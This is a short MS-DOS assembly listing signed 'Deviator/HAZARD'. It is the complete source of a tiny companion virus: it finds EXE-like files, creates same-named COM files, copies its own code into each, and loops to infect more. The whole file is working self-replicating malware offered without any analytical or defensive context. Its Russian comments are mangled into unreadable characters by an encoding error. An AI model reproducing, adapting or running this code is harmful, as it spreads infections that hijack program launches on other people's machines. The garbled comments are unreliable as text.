   ; ‚®â ¥é¥ ®¯â¨¬¨§ æ¨ï, ¯à ¢¤  ¢á¥£®   ®¤¨ ¡ ©â :(.
   ; ‚à®¤¥ à ¡®â®á¯®á¥ â ª-¦¥ ª ª ¨ 36 ¡ ©â¨ª.

   ; *¥ ¡ã¤¥â à ¡®â âì:    Š®£¤  ¨á¯®àç¥ë à¥£¨áâàë (Si<>100h)
   ;           …á«¨ Ch=0 ¯à¨ áâ àâ¥ (®¡§. ¤®«¦¥ ¨á¯®àâ¨âáï ¬ áª®©)
   ;           …á«¨ ¢ PSP ¥áâì â®çª¨ ('.' ¨«¨ 2Eh)

   ; Deviator/HAZARD.

   .model tiny
   .386
   .code
           org 100h
   Mt_35:  db      '*.e*'          ; * è  ¬ áª   (Sub Ch,[xxxx]

           mov ah,4eh              ; ˆé¥¬ ä ©«
   Gotcha: mov dx,si               ; Dx = 100h
           int 21h                 ; Dos

           mov dx,9Eh              ; Dx = 9Eh
           mov ax,5B00h+'.'        ; ˆé¥¬ '.'
   repne   scasb                   ; Lets Go
           mov [di],'MOC'          ; Œ¥ï¥¬ à áè¨à¥¨¥   COM
           mov cx,si               ; Cx = 256 (100h) , Ch ¥ ¢«¨ï¥â
           int 21h                 ; Ah = 5B,á®§¤ âì ä ©« ¥á«¨ ¥ áãé¥áâ¢ã¥â
           xchg ax,bx              ; Handle ¢ Bx
           mov ah,40h              ; *¨è¨¬  á (Cx=100)
           jnc Gotcha              ; *  Gotcha ¥á«¨ ¥â ®è¨¡ª¨
       ret         ; *  ¢ëå®¤

   end     Mt_35
